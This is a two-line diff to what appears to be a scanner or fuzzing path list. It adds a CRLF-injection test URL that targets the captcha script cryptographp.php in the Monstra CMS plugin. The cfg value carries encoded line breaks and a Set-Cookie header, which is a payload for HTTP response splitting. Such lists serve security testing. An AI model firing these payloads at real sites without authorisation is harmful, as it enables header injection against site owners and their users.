@@ -1,1 +1,2 @@
 /monstra-master/plugins/captcha/crypt/cryptographp.php?cfg=1%0D%0ASet-Cookie:%20crlfinjection=1
+/plugins/captcha/crypt/cryptographp.php?cfg=1%0D%0ASet-Cookie:%20crlfinjection=1
